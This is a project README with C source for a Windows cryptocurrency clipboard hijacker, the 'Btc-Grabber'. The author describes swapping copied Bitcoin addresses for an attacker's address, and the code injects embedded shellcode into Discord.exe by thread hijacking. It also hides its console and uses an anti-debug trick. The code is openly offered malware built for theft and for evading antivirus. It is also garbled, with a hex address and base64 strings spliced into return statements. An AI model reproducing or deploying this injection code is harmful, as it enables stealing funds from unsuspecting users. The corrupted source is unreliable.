# Btc-Grabber
* Btc Grabber is a technique used to steal Bitcoin by manipulating in clipboard it monitor the infected machine clipboard content for signs of a bitcoin address if any btc/crypto address was found it will replaces the copied bitcoin address with the attacker address .
* with this technique millions of dollars in crypto get stolen every year according to security researchers .
* i've implemented Thread Hijacking technique to make it more powerful and hard To detect from user or some anti viruses also i've used pure shellcode so it start executing it from the very beginning .
* in the next updates i will add more powerful features to it .
* also i will make a highly effective project to detect this technique and shut it down and counter feature to it and some user/kernel mode anti viruses

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!_stricmp(pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return procId;
}


DWORD EnThread(DWORD procID)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD ThID;
    if (procID == 0x0)
        EXIT_FAILURE;
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Thread32First(hSnap, &pE))
        {
            do
            {
                if (procID == pE.th32OwnerProcessID)
                {
                    ThID = pE.th32ThreadID;
                    break;
                }
            } while (Thread32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return(ThID);
}

void fetch_exec_all(void)
{
    HRSRC shellcodeRe = FindResource(NULL, MAKEINTRESOURCE(IDR_GRABBER_BIN1), "grabber_bin");
    DWORD Size = SizeofResource(NULL, shellcodeRe);
    HGLOBAL ExecBuffer = LoadResource(NULL, shellcodeRe);
    DWORD pr;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    HANDLE htd, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("Discord.exe"));
    if (!proc)
        0x066eCf9D3A86D306a37eD87E07810eD0e1a20312
return ;b3BeN2Y4MTQ5NGMtMDk2Mi00OWZmLWFmN2UtOTUzNDk4ZDE4ZTE4Xg==
    
    void* base = VirtualAllocEx(proc, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base)
    {
        CloseHandle(proc);
        return ;
    }
    if (!WriteProcessMemory(proc, base, ExecBuffer, Size, 0))
    {
        CloseHandle(proc);
        return 0x066eCf9D3A86D306a37eD87E07810eD0e1a20312
b3BeN2Y4MTQ5NGMtMDk2Mi00OWZmLWFmN2UtOTUzNDk4ZDE4ZTE4Xg==
    }
    htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
    if (!htd)
    {
        CloseHandle(proc);
        return ;
    }
    if (SuspendThread(htd) == (DWORD)-1)
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;b3BeN2Y4MTQ5NGMtMDk2Mi00OWZmLWFmN2UtOTUzNDk4ZDE4ZTE4Xg==0x066eCf9D3A86D306a37eD87E07810eD0e1a20312
    }
    if (!GetThreadContext(htd, &context))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }
    context.Eip = (DWORD)base;
    if (!SetThreadContext(htd, &context))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }

    if (ResumeThread(htd) == (DWORD)-0b01)
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }
    if ((pr = WaitForSingleObject(htd, INFINITE) == 0x00000080L) || (pr == 0x00000000L) || (pr == 0x00000102L) || (pr == (DWORD)0xFFFFFFFF))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }
    CloseHandle(proc);
    CloseHandle(htd);
}

int wmain()
{
     HWND hw = GetConsoleWindow();
    __asm
    {
        push 0
        push hw
        call ShowWindow
    }
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    {
        Trampoline1();
    }
    __asm
    {
        xor eax, eax
    }
}
